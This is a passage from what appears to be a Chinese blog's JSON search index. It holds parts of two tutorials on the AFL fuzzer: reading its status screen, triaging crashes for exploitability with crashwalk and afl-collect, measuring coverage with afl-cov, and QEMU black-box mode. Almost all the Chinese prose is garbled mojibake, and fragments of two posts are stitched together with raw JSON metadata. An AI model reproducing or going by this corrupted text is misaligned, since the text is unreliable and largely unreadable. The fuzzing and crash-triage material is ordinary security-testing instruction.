â”‚â”‚ last uniq crash : 0 days, 0 hrs, 4 min, 19 sec â”‚ uniq crashes : 1 â”‚â”‚ last uniq hang : 0 days, 0 hrs, 2 min, 12 sec â”‚ uniq hangs : 1 â”‚â”œâ”€ cycle progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ map coverage â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ now processing : 2 (66.67%) â”‚ map density : 0.00% / 0.00% â”‚â”‚ paths timed out : 0 (0.00%) â”‚ count coverage : 1.00 bits/tuple â”‚â”œâ”€ stage progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€ findings in depth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ now trying : havoc â”‚ favored paths : 1 (33.33%) â”‚â”‚ stage execs : 1433/1536 (93.29%) â”‚ new edges on : 2 (66.67%) â”‚â”‚ total execs : 2.32M â”‚ total crashes : 93.1k (1 unique) â”‚â”‚ exec speed : 0.00/sec (zzzz...) â”‚ total tmouts : 8 (1 unique) â”‚â”œâ”€ fuzzing strategy yields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ path geometry â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ bit flips : 0/1152, 0/1149, 0/1143 â”‚ levels : 2 â”‚â”‚ byte flips : 0/144, 0/14, 0/10 â”‚ pending : 0 â”‚â”‚ arithmetics : 0/888, 0/25, 0/0 â”‚ pend fav : 0 â”‚â”‚ known ints : 0/98, 0/390, 0/440 â”‚ own finds : 1 â”‚â”‚ dictionary : 0/0, 0/0, 0/0 â”‚ imported : n/a â”‚â”‚ havoc : 2/1.50M, 0/819k â”‚ stability : 100.00% â”‚â”‚ trim : 11.88%/64, 80.00% â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ [cpu000:102%] â”‚â”‚ stage execs : 1432/1536 (93.23%) â”‚ new edges on : 2 (66.67%) â”‚+++ Testing aborted by user +++ â”‚ total crashes : 93.1k (1 unique) â”‚[+] We&apos;re done here. Have a nice day! â”‚ total tmouts : 8 (1 unique) â”‚â”œâ”€ fuzzing strategy yields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ path geometry â”€â”€â”€â”€â”€â”€â”€â”€â”¤ ç”±ä¸Šé¢AFLçŠ¶æ€çª—å£ï¼šâ‘  Process timing:Fuzzerè¿è¡Œæ—¶é•¿ã€ä»¥åŠè·ç¦»æœ€è¿‘å‘ç°çš„è·¯å¾„ã€å´©æºƒå’ŒæŒ‚èµ·ï¼ˆè¶…æ—¶ï¼‰ç»è¿‡äº†å¤šé•¿æ—¶é—´ã€‚å·²ç»è¿è¡Œ4m19sï¼Œè·ç¦»ä¸Šä¸€ä¸ªæœ€æ–°è·¯å¾„å·²ç»è¿‡å»2min27sï¼Œè·ç¦»ä¸Šä¸€ä¸ªç‹¬ç‰¹å´©æºƒå·²ç»è¿‡å»4min19sï¼ˆå¯è§æ‰¾åˆ°å´©æºƒçš„é€Ÿåº¦éå¸¸å¿«ï¼‰ï¼Œè·ç¦»ä¸Šä¸€æ¬¡æŒ‚èµ·å·²ç»è¿‡å»2m12sã€‚ â‘¡ Overall resultsï¼šFuzzerå½“å‰çŠ¶æ€çš„æ¦‚è¿°ã€‚ â‘¢ Cycle progressï¼šæˆ‘ä»¬è¾“å…¥é˜Ÿåˆ—çš„è·ç¦»ã€‚é˜Ÿåˆ—ä¸€å…±æœ‰3ä¸ªç”¨ä¾‹ï¼Œç°åœ¨æ˜¯ç¬¬äºŒä¸ªï¼Œ66.67% â‘£ Map coverageï¼šç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ’æ¡©ä»£ç æ‰€è§‚å¯Ÿåˆ°è¦†ç›–èŒƒå›´çš„ç»†èŠ‚ã€‚ â‘¤ Stage progressï¼šFuzzerç°åœ¨æ­£åœ¨æ‰§è¡Œçš„æ–‡ä»¶å˜å¼‚ç­–ç•¥ã€æ‰§è¡Œæ¬¡æ•°å’Œæ‰§è¡Œé€Ÿåº¦ã€‚ â‘¥ Findings in depthï¼šæœ‰å…³æˆ‘ä»¬æ‰¾åˆ°çš„æ‰§è¡Œè·¯å¾„ï¼Œå¼‚å¸¸å’ŒæŒ‚èµ·æ•°é‡çš„ä¿¡æ¯ã€‚ â‘¦ Fuzzing strategy yieldsï¼šå…³äºçªå˜ç­–ç•¥äº§ç”Ÿçš„æœ€æ–°è¡Œä¸ºå’Œç»“æœçš„è¯¦ç»†ä¿¡æ¯ã€‚ â‘§ Path geometryï¼šæœ‰å…³Fuzzeræ‰¾åˆ°çš„æ‰§è¡Œè·¯å¾„çš„ä¿¡æ¯ã€‚ â‘¨ CPU loadï¼šCPUåˆ©ç”¨ç‡ aflä½•æ—¶ç»“æŸ(1) çŠ¶æ€çª—å£ä¸­â€cycles doneâ€å­—æ®µé¢œè‰²å˜ä¸ºç»¿è‰²è¯¥å­—æ®µçš„é¢œè‰²å¯ä»¥ä½œä¸ºä½•æ—¶åœæ­¢æµ‹è¯•çš„å‚è€ƒï¼Œéšç€å‘¨æœŸæ•°ä¸æ–­å¢å¤§ï¼Œå…¶é¢œè‰²ä¹Ÿä¼šç”±æ´‹çº¢è‰²ï¼Œé€æ­¥å˜ä¸ºé»„è‰²ã€è“è‰²ã€ç»¿è‰²ã€‚å½“å…¶å˜ä¸ºç»¿è‰²æ—¶ï¼Œç»§ç»­Fuzzingä¸‹å»ä¹Ÿå¾ˆéš¾æœ‰æ–°çš„å‘ç°äº†ï¼Œè¿™æ—¶ä¾¿å¯ä»¥é€šè¿‡Ctrl-Cåœæ­¢afl-fuzzã€‚(2) è·ä¸Šä¸€æ¬¡å‘ç°æ–°è·¯å¾„ï¼ˆæˆ–è€…å´©æºƒï¼‰å·²ç»è¿‡å»å¾ˆé•¿æ—¶é—´(3) ç›®æ ‡ç¨‹åºçš„ä»£ç å‡ ä¹è¢«æµ‹è¯•ç”¨ä¾‹å®Œå…¨è¦†ç›– å¤„ç†è¾“å‡ºç»“æœ ç¡®å®šé€ æˆè¿™äº›crashesçš„bugæ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼Œæ€ä¹ˆåˆ©ç”¨ï¼Ÿ aflåœ¨fuzzingçš„è¿‡ç¨‹ä¸­åŒæ—¶ä¹Ÿäº§ç”Ÿäº†è¿™äº›æ–‡ä»¶1234567891011121314$ tree ../vuln/out/../vuln/out/â”œâ”€â”€ crashesâ”‚ â”œâ”€â”€ id:000000,sig:11,src:000000,op:havoc,rep:64â”‚ â””â”€â”€ README.txtâ”œâ”€â”€ fuzz_bitmapâ”œâ”€â”€ fuzzer_statsâ”œâ”€â”€ hangsâ”œâ”€â”€ plot_dataâ””â”€â”€ queue â”œâ”€â”€ id:000000,orig:1 â””â”€â”€ id:000001,orig:23 directories, 7 files åœ¨è¾“å‡ºç›®å½•ä¸­åˆ›å»ºäº†ä¸‰ä¸ªå­ç›®å½•å¹¶å®æ—¶æ›´æ–°ï¼š queueï¼š æµ‹è¯•æ¯ä¸ªç‹¬ç‰¹æ‰§è¡Œè·¯å¾„çš„æ¡ˆä¾‹ï¼Œä»¥åŠç”¨æˆ·æä¾›çš„æ‰€æœ‰èµ·å§‹æ–‡ä»¶ã€‚ crashesï¼š å¯¼è‡´è¢«æµ‹ç¨‹åºæ¥æ”¶è‡´å‘½ä¿¡å·çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ï¼ˆä¾‹å¦‚ï¼ŒSIGSEGVï¼ŒSIGILLï¼ŒSIGABRTï¼‰ã€‚æ¡ç›®æŒ‰æ¥æ”¶ä¿¡å·åˆ†ç»„ã€‚ hangsï¼š å¯¼è‡´æµ‹è¯•ç¨‹åºè¶…æ—¶çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚å°†æŸäº›å†…å®¹å½’ç±»ä¸ºæŒ‚èµ·ä¹‹å‰çš„é»˜è®¤æ—¶é—´é™åˆ¶æ˜¯1ç§’å†…çš„è¾ƒå¤§å€¼å’Œ-tå‚æ•°çš„å€¼ã€‚å¯ä»¥é€šè¿‡è®¾ç½®AFL_HANG_TMOUTæ¥å¾®è°ƒè¯¥å€¼ï¼Œä½†è¿™å¾ˆå°‘æ˜¯å¿…éœ€çš„ã€‚ å´©æºƒå’ŒæŒ‚èµ·è¢«è§†ä¸ºâ€œå”¯ä¸€â€ :å¦‚æœç›¸å…³çš„æ‰§è¡Œè·¯å¾„æ¶‰åŠåœ¨å…ˆå‰è®°å½•çš„æ•…éšœä¸­æœªè§çš„ä»»ä½•çŠ¶æ€è½¬æ¢ã€‚å¦‚æœå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¾¾åˆ°å•ä¸ªé”™è¯¯ï¼Œé‚£ä¹ˆåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šæœ‰ä¸€äº›è®¡æ•°é€šè´§è†¨èƒ€ï¼Œä½†è¿™åº”è¯¥ä¼šè¿…é€Ÿé€æ¸å‡å°‘ã€‚ fuzzer_statsï¼šafl-fuzzçš„è¿è¡ŒçŠ¶æ€ã€‚ plot_dataï¼šç”¨äºafl-plotç»˜å›¾ã€‚ å´©æºƒç±»å‹å’Œå¯åˆ©ç”¨æ€§ triage_crashesAFLæºç çš„experimentalç›®å½•ä¸­æœ‰ä¸€ä¸ªåä¸ºtriage_crashes.shçš„è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è§¦å‘æ”¶é›†åˆ°çš„crashesã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ11ä»£è¡¨äº†SIGSEGVä¿¡å·ï¼Œæœ‰å¯èƒ½æ˜¯å› ä¸ºç¼“å†²åŒºæº¢å‡ºå¯¼è‡´è¿›ç¨‹å¼•ç”¨äº†æ— æ•ˆçš„å†…å­˜ï¼›06ä»£è¡¨äº†SIGABRTä¿¡å·ï¼Œå¯èƒ½æ˜¯æ‰§è¡Œäº†abort\\assertå‡½æ•°æˆ–double freeå¯¼è‡´ï¼Œè¿™äº›ç»“æœå¯ä»¥ä½œä¸ºç®€å•çš„å‚è€ƒã€‚ 12$ experimental/crash_triage/triage_crashes.sh ../vuln/out/ ../vuln/v1-afl 2&gt;&amp;1 | grep SIGNAL+++ ID 000000, SIGNAL 11 +++ crashwalkå¦‚æœä½ æƒ³å¾—åˆ°æ›´ç»†è‡´çš„crashesåˆ†ç±»ç»“æœï¼Œä»¥åŠå¯¼è‡´crashesçš„å…·ä½“åŸå› ï¼Œé‚£ä¹ˆcrashwalkå°±æ˜¯ä¸é”™çš„é€‰æ‹©ä¹‹ä¸€ã€‚è¿™ä¸ªå·¥å…·åŸºäºgdbçš„exploitableæ’ä»¶ï¼Œå®‰è£…ä¹Ÿç›¸å¯¹ç®€å•ï¼Œåœ¨ubuntuä¸Šï¼Œåªéœ€è¦å¦‚ä¸‹å‡ æ­¥å³å¯ï¼š 12345678$ apt-get install gdb golang$ mkdir tools$ cd tools$ git clone https://github.com/jfoote/exploitable.git$ mkdir go$ export GOPATH=~/tools/go$ export CW_EXPLOITABLE=~/tools/exploitable/exploitable/exploitable.py$ go get -u github.com/bnagy/crashwalk/cmd/... è¿™éƒ¨åˆ†æˆ‘å¥½åƒè¿˜æ²¡å®Œæˆ afl-collect12345$ afl-collect -d crashes.db -e gdb_script -j 8 -r ../vuln/out/ ../vuln/testcase -- ../vuln/v1-afl*** GDB+EXPLOITABLE SCRIPT OUTPUT ***[00001] out:id:000000,sig:11,src:000000,op:havoc,rep:64.................: EXPLOITABLE [ReturnAv (1/22)]*** ***************************** *** 0x02 ä»£ç è¦†ç›–ç‡åŠå…¶ç›¸å…³æ¦‚å¿µ ä»£ç è¦†ç›–ç‡æ˜¯æ¨¡ç³Šæµ‹è¯•ä¸­ä¸€ä¸ªæå…¶é‡è¦çš„æ¦‚å¿µï¼Œä½¿ç”¨ä»£ç è¦†ç›–ç‡å¯ä»¥è¯„ä¼°å’Œæ”¹è¿›æµ‹è¯•è¿‡ç¨‹ï¼Œæ‰§è¡Œåˆ°çš„ä»£ç è¶Šå¤šï¼Œæ‰¾åˆ°bugçš„å¯èƒ½æ€§å°±è¶Šå¤§ï¼Œæ¯•ç«Ÿï¼Œåœ¨è¦†ç›–çš„ä»£ç ä¸­å¹¶ä¸èƒ½100%å‘ç°bugï¼Œåœ¨æœªè¦†ç›–çš„ä»£ç ä¸­å´æ˜¯100%æ‰¾ä¸åˆ°ä»»ä½•bugçš„ã€‚ä»£ç è¦†ç›–ç‡æ˜¯ä¸€ç§åº¦é‡ä»£ç çš„è¦†ç›–ç¨‹åº¦çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æŒ‡æºä»£ç ä¸­çš„æŸè¡Œä»£ç æ˜¯å¦å·²æ‰§è¡Œï¼›å¯¹äºŒè¿›åˆ¶ç¨‹åºï¼Œè¿˜å¯å°†æ­¤æ¦‚å¿µç†è§£ä¸ºæ±‡ç¼–ä»£ç ä¸­çš„æŸæ¡æŒ‡ä»¤æ˜¯å¦å·²æ‰§è¡Œã€‚å…¶è®¡é‡æ–¹å¼å¾ˆå¤šï¼Œä½†æ— è®ºæ˜¯GCCçš„GCOVè¿˜æ˜¯LLVMçš„SanitizerCoverageï¼Œéƒ½æä¾›å‡½æ•°ï¼ˆfunctionï¼‰ã€åŸºæœ¬å—ï¼ˆbasic-blockï¼‰ã€è¾¹ç•Œï¼ˆedgeï¼‰ä¸‰ç§çº§åˆ«çš„è¦†ç›–ç‡æ£€æµ‹ã€‚ è®¡ç®—ä»£ç è¦†ç›–ç‡GCOVï¼šæ’æ¡©ç”Ÿæˆè¦†ç›–ç‡ LCOVï¼šå›¾å½¢å±•ç¤ºè¦†ç›–ç‡ afl-covï¼šè°ƒç”¨å‰ä¸¤ä¸ªå·¥å…·è®¡ç®—aflæµ‹è¯•ç”¨ä¾‹çš„è¦†ç›–ç‡ gccæ’æ¡©-fprofile-arcs -ftest-coverage 1$ gcc -fprofile-arcs -ftest-coverage ./v1.c -o v1-cov afl-covè®¡ç®—ä¹‹å‰fuzzerçš„è¿‡ç¨‹ï¼ˆç»“æŸåï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839$ ../afl-2.52b/afl-cov/afl-cov -d ./out/ --enable-branch-coverage -c . -e &quot;cat AFL_FILE | ./v1-cov AFL_FILE&quot; Non-zero exit status &apos;1&apos; for CMD: /usr/bin/readelf -a cat*** Imported 2 new test cases from: ./out//queue [+] AFL test case: id:000000,orig:1 (0 / 2), cycle: 0 lines......: 100.0% (6 of 6 lines) functions..: 100.0% (2 of 2 functions) branches...: no data found Coverage diff (init) id:000000,orig:1 diff (init) -&gt; id:000000,orig:1 New src file: /home/han/ck/vuln/v1.c New &apos;function&apos; coverage: main() New &apos;function&apos; coverage: vulnerable_function() New &apos;line&apos; coverage: 11 New &apos;line&apos; coverage: 12 New &apos;line&apos; coverage: 13 New &apos;line&apos; coverage: 6 New &apos;line&apos; coverage: 8 New &apos;line&apos; coverage: 9++++++ BEGIN - first exec output for CMD: cat ./out//queue/id:000000,orig:1 | ./v1-cov ./out//queue/id:000000,orig:1 Hello, World ++++++ END [+] AFL test case: id:000001,orig:2 (1 / 2), cycle: 0 lines......: 100.0% (6 of 6 lines) functions..: 100.0% (2 of 2 functions) branches...: no data found [+] Processed 2 / 2 test cases. [+] Final zero coverage report: ./out//cov/zero-cov [+] Final positive coverage report: ./out//cov/pos-cov lines......: 100.0% (6 of 6 lines) functions..: 100.0% (2 of 2 functions) branches...: no data found [+] Final lcov web report: ./out//cov/web/index.html LCOVå±•ç¤º 0x03 é»‘ç›’æµ‹è¯•ï¼ˆä½¿ç”¨qemu12345678910111213141516171819202122232425$ ./afl-fuzz -i ../vuln/testcase/ -o ../vuln/outQemu -Q ../vuln/v1american fuzzy lop 2.52b (v1)â”Œâ”€ process timing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ overall results â”€â”€â”€â”€â”€â”â”‚ run time : 0 days, 0 hrs, 0 min, 41 sec â”‚ cycles done : 232 â”‚â”‚ last new path : none yet (odd, check syntax!) â”‚ total paths : 2 â”‚â”‚ last uniq crash : 0 days, 0 hrs, 0 min, 41 sec â”‚ uniq crashes : 1 â”‚â”‚ last uniq hang : none seen yet â”‚ uniq hangs : 0 â”‚â”œâ”€ cycle progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ map coverage â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ now processing : 0* (0.00%) â”‚ map density : 0.04% / 0.04% â”‚â”‚ paths timed out : 0 (0.00%) â”‚ count coverage : 1.00 bits/tuple â”‚â”œâ”€ stage progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€ findings in depth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ now trying : havoc â”‚ favored paths : 1 (50.00%) â”‚â”‚ stage execs : 255/256 (99.61%) â”‚ new edges on : 1 (50.00%) â”‚â”‚ total execs : 121k â”‚ total crashes : 33 (1 unique) â”‚â”‚ exec speed : 2860/sec â”‚ total tmouts : 0 (0 unique) â”‚â”œâ”€ fuzzing strategy yields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ path geometry â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ bit flips : 0/56, 0/54, 0/50 â”‚ levels : 1 â”‚â”‚ byte flips : 0/7, 0/5, 0/1 â”‚ pending : 0 â”‚â”‚ arithmetics : 0/392, 0/25, 0/0 â”‚ pend fav : 0 â”‚â”‚ known ints : 0/36, 0/138, 0/44 â”‚ own finds : 0 â”‚â”‚ dictionary : 0/0, 0/0, 0/0 â”‚ imported : n/a â”‚â”‚ havoc : 1/120k, 0/0 â”‚ stability : 100.00% â”‚â”‚ trim : 82.61%/5, 0.00% â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜^Câ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ [cpu000:102%] å¾…å®Œæˆå¯¹é»‘ç›’æµ‹è¯•åŸç†çš„åˆ†æ","categories":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/categories/äºŒè¿›åˆ¶/"}],"tags":[{"name":"AFL","slug":"AFL","permalink":"https://cool-y.github.io/tags/AFL/"},{"name":"æ¨¡ç³Šæµ‹è¯•","slug":"æ¨¡ç³Šæµ‹è¯•","permalink":"https://cool-y.github.io/tags/æ¨¡ç³Šæµ‹è¯•/"}]},{"title":"æ¨¡ç³Šæµ‹è¯•ä¸AFL","slug":"AFL-first-learn","date":"2019-07-01T09:25:36.000Z","updated":"2021-04-10T13:35:23.942Z","comments":true,"path":"2019/07/01/AFL-first-learn/","link":"","permalink":"https://cool-y.github.io/2019/07/01/AFL-first-learn/","excerpt":"","text":"0x01 æ¨¡ç³Šæµ‹è¯•é¦–å…ˆï¼Œæ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰æ˜¯ä¸€ç§æµ‹è¯•æ‰‹æ®µï¼Œå®ƒæŠŠç³»ç»Ÿçœ‹æˆä¸€ä¸ªæ‘¸ä¸æ¸…å†…éƒ¨ç»“æ„çš„é»‘ç›’ï¼Œåªæ˜¯å‘å…¶è¾“å…¥æ¥å£éšæœºåœ°å‘é€åˆæ³•æµ‹è¯•ç”¨ä¾‹ï¼Œè¿™äº›ç”¨ä¾‹å¹¶ä¸æ˜¯å¼€å‘è€…æ‰€é¢„æœŸçš„è¾“å…¥ï¼Œæ‰€ä»¥ææœ‰å¯èƒ½ä¼šé€ æˆç³»ç»Ÿçš„å´©æºƒï¼Œé€šè¿‡åˆ†æå´©æºƒä¿¡æ¯ï¼Œæµ‹è¯•äººå‘˜ï¼ˆé»‘å®¢ï¼‰å°±å¯ä»¥è¯„ä¼°ç³»ç»Ÿæ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼Œå°±å¥½åƒæ˜¯ä¸€ä¸ªä¸æ–­æ¢æµ‹ç³»ç»Ÿå¯ä»¥æ‰¿å—çš„è¾“å…¥æé™çš„è¿‡ç¨‹ï¼Œè®©æˆ‘æƒ³èµ·å­¦ç”µå­çš„æ—¶å€™å¯¹ä¸€ä¸ªæ»¤æ³¢å™¨è¿›è¡Œå¸¦å®½çš„è¯„ä¼°ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“å†…éƒ¨ç”µè·¯åŸç†ï¼Œé‚£ä¹ˆè¿™ä¸ªå™¨ä»¶å¯¹äºæˆ‘ä»¬å°±æ˜¯ç™½ç›’äº†ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡å…¬å¼è®¡ç®—ç†è®ºå¸¦å®½ï¼Œç°åœ¨ç³»ç»Ÿå¯¹äºæˆ‘ä»¬è€Œè¨€æ˜¯ä¸€ä¸ªé»‘ç›’ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨è¶³å¤Ÿå¤§é¢‘ç‡èŒƒå›´å†…å¯¹å…¶ä¸æ–­è¾“å…¥ä¿¡å·ï¼Œå°±èƒ½æµ‹è¯•å‡ºå…¶å®é™…å¸¦å®½ã€‚ æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ä¸€è§ˆ åŸºäºå˜ç§çš„Fuzzer åŸºäºæ¨¡æ¿çš„Fuzzer åŸºäºåé¦ˆæ¼”è¿›çš„Fuzzer åŸºäºè¿½è¸ªè·¯å¾„è¦†ç›–ç‡ åŸºäºåˆ†æ”¯è¦†ç›–ç‡ åœ¨å·²çŸ¥åˆæ³•çš„è¾“å…¥çš„åŸºç¡€ä¸Šï¼Œå¯¹è¯¥è¾“å…¥è¿›è¡Œéšæœºå˜ç§æˆ–è€…ä¾æ®æŸç§ç»éªŒæ€§çš„å˜ç§ï¼Œä»è€Œäº§ç”Ÿä¸å¯é¢„æœŸçš„æµ‹è¯•è¾“å…¥ã€‚ æ­¤ç±»Fuzzerå·¥å…·çš„è¾“å…¥æ•°æ®ï¼Œä¾èµ–äºå®‰å…¨äººå‘˜ç»“åˆè‡ªå·±çš„çŸ¥è¯†ï¼Œç»™å‡ºè¾“å…¥æ•°æ®çš„æ¨¡æ¿ï¼Œæ„é€ ä¸°å¯Œçš„è¾“å…¥æµ‹è¯•æ•°æ®ã€‚ æ­¤ç±»Fuzzerä¼šå®æ—¶çš„è®°å½•å½“å‰å¯¹äºç›®æ ‡ç¨‹åºæµ‹è¯•çš„è¦†ç›–ç¨‹åº¦ï¼Œä»è€Œè°ƒæ•´è‡ªå·±çš„fuzzingè¾“å…¥ã€‚ PAP:è·¯å¾„ç¼–ç çš„ç®—æ³•;åé¢ä¼šäº§ç”Ÿè·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ æ¼æ´çš„çˆ†å‘å¾€å¾€ç”±äºè§¦å‘äº†éé¢„æœŸçš„åˆ†æ”¯ Taof, GPF, ProxyFuzz, Peach Fuzzer SPIKE, Sulley, Muâ€4000, Codenomicon AFL 0x02 AFLå¿«é€Ÿå…¥é—¨1ï¼‰ç”¨makeç¼–è¯‘AFLã€‚å¦‚æœæ„å»ºå¤±è´¥ï¼Œè¯·å‚é˜…docs / INSTALLä»¥è·å–æç¤ºã€‚2ï¼‰æŸ¥æ‰¾æˆ–ç¼–å†™ä¸€ä¸ªç›¸å½“å¿«é€Ÿå’Œç®€å•çš„ç¨‹åºï¼Œè¯¥ç¨‹åºä»æ–‡ä»¶æˆ–æ ‡å‡†è¾“å…¥ä¸­è·å–æ•°æ®ï¼Œä»¥ä¸€ç§æœ‰ä»·å€¼çš„æ–¹å¼å¤„ç†å®ƒï¼Œç„¶åå¹²å‡€åœ°é€€å‡ºã€‚å¦‚æœæµ‹è¯•ç½‘ç»œæœåŠ¡ï¼Œè¯·å°†å…¶ä¿®æ”¹ä¸ºåœ¨å‰å°è¿è¡Œå¹¶ä»stdinè¯»å–ã€‚åœ¨å¯¹ä½¿ç”¨æ ¡éªŒå’Œçš„æ ¼å¼è¿›è¡Œæ¨¡ç³Šæµ‹è¯•æ—¶ï¼Œä¹Ÿè¦æ³¨é‡Šæ‰æ ¡éªŒå’ŒéªŒè¯ç ã€‚é‡åˆ°æ•…éšœæ—¶ï¼Œç¨‹åºå¿…é¡»æ­£å¸¸å´©æºƒã€‚æ³¨æ„è‡ªå®šä¹‰SIGSEGVæˆ–SIGABRTå¤„ç†ç¨‹åºå’Œåå°è¿›ç¨‹ã€‚æœ‰å…³æ£€æµ‹éå´©æºƒç¼ºé™·çš„æç¤ºï¼Œè¯·å‚é˜…docs/READMEä¸­çš„ç¬¬11èŠ‚ã€‚3ï¼‰ä½¿ç”¨afl-gccç¼–è¯‘è¦æ¨¡ç³Šçš„ç¨‹åº/åº“ã€‚ä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯ï¼š12$ CC = /path/to/afl-gcc CXX =/path/to/afl-g++ ./configure --disable-shared$ make clean all å¦‚æœç¨‹åºæ„å»ºå¤±è´¥ï¼Œè¯·è”ç³» &#97;&#x66;&#x6c;&#x2d;&#x75;&#x73;&#101;&#x72;&#115;&#64;&#x67;&#x6f;&#x6f;&#x67;&#108;&#101;&#103;&#x72;&#111;&#x75;&#112;&#115;&#x2e;&#99;&#111;&#x6d;ã€‚4ï¼‰è·å–ä¸€ä¸ªå¯¹ç¨‹åºæœ‰æ„ä¹‰çš„å°è€Œæœ‰æ•ˆçš„è¾“å…¥æ–‡ä»¶ã€‚åœ¨æ¨¡ç³Šè¯¦ç»†è¯­æ³•ï¼ˆSQLï¼ŒHTTPç­‰ï¼‰æ—¶ï¼Œä¹Ÿè¦åˆ›å»ºå­—å…¸ï¼Œå¦‚dictionaries/README.dictionariesä¸­æ‰€è¿°ã€‚5ï¼‰å¦‚æœç¨‹åºä»stdinè¯»å–ï¼Œåˆ™è¿è¡Œafl-fuzzï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š./afl-fuzz -i testcase_dir -o findings_dir -- /path/to/tested/program [... program&#39;s cmdline ...] å¦‚æœç¨‹åºä»æ–‡ä»¶ä¸­è·å–è¾“å…¥ï¼Œåˆ™å¯ä»¥åœ¨ç¨‹åºçš„å‘½ä»¤è¡Œä¸­è¾“å…¥@@; AFLä¼šä¸ºæ‚¨æ”¾ç½®ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶åã€‚ ä¸€äº›å‚è€ƒæ–‡æ¡£ docs/README - AFLçš„ä¸€èˆ¬ä»‹ç»ï¼Œdocs/perf_tips.txt - å…³äºå¦‚ä½•å¿«é€Ÿæ¨¡ç³Šçš„ç®€å•æç¤ºï¼Œdocs/status_screen.txt - UIä¸­æ˜¾ç¤ºçš„èŠ±çµ®çš„è§£é‡Šï¼Œdocs/parallel_fuzzing.txt - å…³äºåœ¨å¤šä¸ªæ ¸ä¸Šè¿è¡ŒAFLçš„å»ºè®®Generated test cases for common image formats - ç”Ÿæˆå›¾åƒæ–‡ä»¶æµ‹è¯•ç”¨ä¾‹çš„demoTechnical â€œwhitepaperâ€ for afl-fuzz - æŠ€æœ¯ç™½çš®ä¹¦ é€‚ç”¨ç¯å¢ƒè¯¥å·¥å…·å·²ç¡®è®¤é€‚ç”¨äº32ä½å’Œ64ä½çš„x86 Linuxï¼ŒOpenBSDï¼ŒFreeBSDå’ŒNetBSDã€‚ å®ƒä¹Ÿé€‚ç”¨äºMacOS Xå’ŒSolarisï¼Œä½†æœ‰ä¸€äº›é™åˆ¶ã€‚ å®ƒæ”¯æŒç”¨Cï¼ŒC ++æˆ–Objective Cç¼–å†™çš„ç¨‹åºï¼Œä½¿ç”¨gccæˆ–clangç¼–è¯‘ã€‚ 